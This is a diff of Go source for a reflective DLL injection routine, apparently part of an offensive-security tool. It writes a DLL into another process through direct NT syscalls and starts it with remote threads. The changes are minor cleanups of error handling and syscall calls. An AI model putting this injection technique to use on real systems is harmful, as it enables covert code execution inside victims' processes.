@@ -111,7 +111,7 @@ func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs
 	}
 	defer func() {
 		if hProc != 0 {
-			syscallNtClose(mgr, hProc)
+			_ = syscallNtClose(mgr, hProc)
 		}
 	}()
 
@@ -125,7 +125,7 @@ func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs
 		headerSize = uint32(len(dllData))
 	}
 	if err := syscallNtWriteVirtualMemory(mgr, hProc, imageBase, dllData[:headerSize]); err != nil {
-		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+		_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 		return "", fmt.Errorf("write headers: %w", err)
 	}
 
@@ -144,7 +144,7 @@ func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs
 		sectionData := dllData[sec.pointerToRawData:rawEnd]
 		dstAddr := imageBase + uintptr(sec.virtualAddress)
 		if err := syscallNtWriteVirtualMemory(mgr, hProc, dstAddr, sectionData); err != nil {
-			syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+			_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 			return "", fmt.Errorf("write section %d: %w", i, err)
 		}
 	}
@@ -152,24 +152,24 @@ func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs
 	imageBaseDelta := uint64(imageBase) - prefImageBase
 
 	if err := processRelocationsRemote(mgr, hProc, dllData, imageBase, imageBaseDelta, is64Bit, ntOffset); err != nil {
-		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+		_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 		return "", fmt.Errorf("relocations: %w", err)
 	}
 
 	if err := resolveImportsRemote(mgr, hProc, dllData, imageBase, is64Bit, ntOffset); err != nil {
-		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+		_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 		return "", fmt.Errorf("imports: %w", err)
 	}
 
 	if err := setRemoteSectionProtections(mgr, hProc, dllData, imageBase, numberOfSections, sectionOffset, is64Bit); err != nil {
-		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+		_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 		return "", fmt.Errorf("protections: %w", err)
 	}
 
 	if exportName != "" {
 		exportRVA := findExportAddressInPE(dllData, exportName, ntOffset)
 		if exportRVA == 0 {
-			syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+			_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 			return "", fmt.Errorf("export %s not found in DLL", exportName)
 		}
 		exportAddr := imageBase + uintptr(exportRVA)
@@ -180,17 +180,17 @@ func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs
 			argBytes := append([]byte(exportArgs), 0)
 			argAddr, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(len(argBytes)), pageReadwrite)
 			if err != nil {
-				syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+				_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 				return "", fmt.Errorf("alloc args: %w", err)
 			}
 			if err := syscallNtWriteVirtualMemory(mgr, hProc, argAddr, argBytes); err != nil {
-				syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+				_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 				return "", fmt.Errorf("write args: %w", err)
 			}
 
 			hThread, err := syscallNtCreateThreadExParam(mgr, hProc, exportAddr, argAddr)
 			if err != nil {
-				syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+				_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 				_ = syscallNtFreeVirtualMemory(mgr, hProc, argAddr)
 				return "", fmt.Errorf("create remote thread: %w", err)
 			}
@@ -203,7 +203,7 @@ func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs
 
 		hThread, err := syscallNtCreateThreadExParam(mgr, hProc, exportAddr, 0)
 		if err != nil {
-			syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+			_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 			return "", fmt.Errorf("create remote thread: %w", err)
 		}
 		ntWaitForThread(mgr, hThread)
@@ -217,13 +217,13 @@ func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs
 
 	stubAddr, err := writeDllMainStubRemote(mgr, hProc, imageBase, imageBase+uintptr(entryPoint))
 	if err != nil {
-		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+		_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 		return "", fmt.Errorf("write DllMain stub: %w", err)
 	}
 
 	hThread, err := syscallNtCreateThreadExParam(mgr, hProc, stubAddr, 0)
 	if err != nil {
-		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
+		_ = syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
 		return "", fmt.Errorf("create remote thread: %w", err)
 	}
 
@@ -494,7 +494,7 @@ func ntWaitForThread(mgr *syscallManager, hThread uintptr) {
 	if err != nil {
 		return
 	}
-	syscall.Syscall6(stub, 3, hThread, 0, 0, 0, 0, 0)
+	syscall.SyscallN(stub, hThread, 0, 0, 0, 0, 0)
 }
 
 func rvaToFileOffset(dllData []byte, rva uint32, ntOffset uintptr) uint32 {
